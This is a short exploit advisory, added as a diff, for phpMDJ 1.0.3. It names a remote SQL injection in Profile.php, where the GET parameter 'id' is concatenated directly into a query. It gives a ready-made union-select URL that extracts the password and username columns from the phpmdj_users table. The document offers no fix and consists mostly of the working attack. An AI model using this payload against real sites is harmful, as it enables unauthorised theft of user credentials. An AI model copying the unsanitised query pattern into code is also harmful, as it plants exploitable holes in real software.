@@ -1,0 +1,18 @@
+,--------------------------------------------------------------,
+> Vulnerable Script : phpMDJ 1.0.3                             \
+> Download : http://www.weboac.be/phpmdj/docs/phpmdj1.0.3.zip  \
+> Vulnerability : Remote Sql Injection                         \
+'--------------------------------------------------------------'
+
+,-------------------------------------------------------------------------------------------------------------------------------------,
+> Profile.php															      \
+> Line 14 : $membre = $_GET['id'];												      \
+> Line 15 :															      \
+> Line 16 : $sql = "SELECT a.nom AS nGroupe, u.* FROM phpmdj_users u, phpmdj_auth a WHERE u.groupe = a.id_groupe AND u.id = $membre"; \
+>																      \
+> Injection:															      \
+> http://site/path/profile.php?id=[SQL]												      \
+>																      \
+> Example:															      \
+> http://site/path/profile.php?id=-1 union select 1,2,3,mdp,5,6,pseudo,8,9,10,11,12,13,14,15,16 FROM phpmdj_users where id=1--	      \
+'-------------------------------------------------------------------------------------------------------------------------------------'
